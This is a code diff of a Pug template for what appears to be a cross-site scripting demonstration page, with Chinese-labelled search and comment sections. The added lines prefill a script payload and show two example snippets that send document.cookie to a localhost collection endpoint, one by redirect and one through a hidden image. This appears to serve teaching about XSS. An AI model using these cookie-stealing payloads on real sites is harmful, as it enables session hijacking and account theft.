@@ -1,13 +1,24 @@
 extends layout
 
 block content
-    h1= title
-    form(action="/", method="get")
-        input(type="text", name="q", class="search-text", value="<script>alert(1)</script>")
-        input(type="button", value="xss", class="xss")
-        input(type="submit", value="search")
-    if query
-        p(id="result") 你搜索的是 #{query}
-    else
-        p(id="result") 请输入搜索内容
+    #search
+        h1 搜索大全
+        form(action="/", method="get")
+            input(type="text", name="q", class="search-text", value="<script>alert(document.cookie)</script>")
+            input(type="button", value="xss", class="xss")
+            input(type="submit", value="search")
+        if query
+            p(id="result") 你搜索的是 #{query}
+        else
+            p(id="result") 请输入搜索内容
+
+    #comment
+        h1 评论
+        textarea(class="comment-text") <script></script>
+        .comment-list
+            p 示例1:
+            code location.href='http://localhost:3000/cookie/'+document.cookie;
+            p 示例2:
+            code var img = document.createElement('img');img.src='http://localhost:3000/cookie/' + document.cookie;img.style.display='none';document.getElementsByTagName('body')[0].appendChild(img);
+        input(type="button", value="提交评论", class="submit-comment")
     script(src="/javascripts/dist/xss.js")
